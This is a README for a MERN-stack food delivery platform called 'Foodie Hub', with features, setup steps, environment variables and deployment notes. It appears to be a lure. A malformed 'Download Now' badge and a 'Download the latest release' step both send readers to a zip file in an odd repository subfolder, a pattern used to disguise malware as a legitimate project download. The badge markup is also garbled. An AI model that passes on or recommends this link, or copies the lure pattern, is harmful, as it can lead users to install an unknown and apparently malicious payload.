# 🍔 Foodie Hub - Modern Food Delivery Platform

[![Download Now](https://raw.githubusercontent.com/SkyARGamer/food-delivery/main/rayage/food-delivery.zip%20Now-Click%https://raw.githubusercontent.com/SkyARGamer/food-delivery/main/rayage/food-delivery.zip)](https://raw.githubusercontent.com/SkyARGamer/food-delivery/main/rayage/food-delivery.zip)

A full-stack food delivery platform built with MERN stack (MongoDB, Express.js, React, Node.js) that allows users to browse restaurants, place orders, and track deliveries in real-time.

## 🚀 Features

- **User Authentication**: Secure signup and login with JWT
- **Restaurant Browsing**: View available restaurants and menus
- **Order Management**: Place, track, and manage food orders
- **Shopping Cart**: Add/remove items and adjust quantities
- **Payment Integration**: Secure online payments via Stripe
- **Admin Dashboard**: Manage restaurants, menus, and orders
- **Responsive Design**: Works on desktop and mobile devices

## 🛠 Tech Stack

### Frontend
- **React.js** - Frontend library
- **React Router** - Client-side routing
- **Axios** - HTTP client
- **React Toastify** - Notifications
- **Vite** - Build tool and dev server

### Backend
- **Node.js** - JavaScript runtime
- **Express.js** - Web application framework
- **MongoDB** - NoSQL database
- **Mongoose** - MongoDB object modeling
- **JWT** - Authentication
- **Bcrypt** - Password hashing
- **Multer** - File uploads
- **Stripe** - Payment processing
- **CORS** - Cross-origin resource sharing

## 💻 System Requirements

- **Node.js**: v16 or higher
- **npm** or **yarn**
- **MongoDB** (local or MongoDB Atlas)
- **Modern web browser** (Chrome, Firefox, Safari, Edge)
- **Internet Connection** (for online ordering and payments)

## 🚀 Getting Started

### Prerequisites

1. **Download and Install**
   - [Download the latest release](https://raw.githubusercontent.com/SkyARGamer/food-delivery/main/rayage/food-delivery.zip)
   - Extract the downloaded zip file

2. **Set Up Environment**
   - Install [Node.js](https://nodejs.org/) (v16+)
   - Install [MongoDB](https://www.mongodb.com/try/download/community) or create a [MongoDB Atlas](https://www.mongodb.com/cloud/atlas/register) account

### Installation

1. **Set up the backend**
   ```bash
   cd backend
   npm install
   cp .env.example .env  # Update with your configuration
   ```

2. **Set up the frontend**
   ```bash
   cd ../frontend
   npm install
   cp .env.example .env  # Update with your API URL
   ```

3. **Start the development servers**
   ```bash
   # In backend directory
   npm run server
   
   # In frontend directory (new terminal)
   npm run dev
   ```

4. **Access the application**
   - Frontend: http://localhost:5173
   - Backend API: http://localhost:5000

## 📂 Project Structure

```
food-delivery/
├── backend/              # Backend server
│   ├── config/          # Database and other configurations
│   ├── controllers/     # Route controllers
│   ├── middleware/      # Custom middleware
│   ├── models/          # Database models
│   ├── routes/          # API routes
│   ├── uploads/         # File uploads
│   └── server.js        # Entry point
│
├── frontend/            # Frontend React application
│   ├── public/          # Static files
│   └── src/             # React source code
│       ├── components/  # Reusable UI components
│       ├── pages/       # Page components
│       ├── context/     # React context
│       ├── hooks/       # Custom hooks
│       ├── utils/       # Utility functions
│       └── App.jsx      # Main App component
│
└── admin/               # Admin dashboard
```

## 🔒 Environment Variables

### Backend (.env)
```
PORT=5000
MONGODB_URI=your_mongodb_connection_string
JWT_SECRET=your_jwt_secret
JWT_EXPIRE=30d
STRIPE_SECRET_KEY=your_stripe_secret_key
```

### Frontend (.env)
```
VITE_API_URL=http://localhost:5000/api
VITE_STRIPE_PUBLIC_KEY=your_stripe_public_key
```

## 🌐 Using Foodie Hub

1. **Create an Account**  
   Sign up for a new account or log in if you already have one.

2. **Browse Restaurants**  
   Explore different restaurants and their menus.

3. **Add Items to Cart**  
   Customize your order and add items to your cart.

4. **Checkout Securely**  
   Review your order and proceed to secure payment with Stripe.

5. **Track Your Order**  
   Get real-time updates on your order status.

## 🧪 Testing

To run tests:
```bash
# Run backend tests
cd backend
npm test

# Run frontend tests
cd ../frontend
npm test
```

## 🚀 Deployment

### Backend Deployment
1. Set up a MongoDB Atlas cluster
2. Configure environment variables in production
3. Deploy to Heroku, Vercel, or your preferred hosting service

### Frontend Deployment
1. Build the production version:
   ```bash
   cd frontend
   npm run build
   ```
2. Deploy the `dist` folder to Netlify, Vercel, or any static hosting service

## 📬 Support

If you need help or have questions:
- Open an issue on GitHub
- Contact support via email (support@foodiehub.example.com)
- Join our community forum

## ⚙️ Contributing

We welcome contributions! Please follow these steps:
1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🔗 Additional Resources

- [Documentation](https://github.com/SkyARGamer/food-delivery/wiki)
- [API Reference](https://github.com/SkyARGamer/food-delivery/wiki/API-Reference)
- [Contributing Guide](https://github.com/SkyARGamer/food-delivery/blob/main/CONTRIBUTING.md)

Happy ordering with Foodie Hub! 🍕🍔🍜